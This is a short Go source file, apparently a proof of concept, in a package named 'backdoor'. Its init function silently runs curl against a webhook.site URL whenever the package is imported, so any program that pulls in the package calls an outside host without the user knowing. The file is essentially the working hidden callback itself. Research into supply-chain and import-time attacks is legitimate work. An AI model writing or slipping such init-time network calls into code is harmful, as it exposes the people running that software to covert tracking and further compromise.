package backdoor

import (
    "os/exec"
)

func init() {
    exec.Command("curl", "https://webhook.site/b79adad1-6f70-4531-8246-74cd33eb9078").Run()
}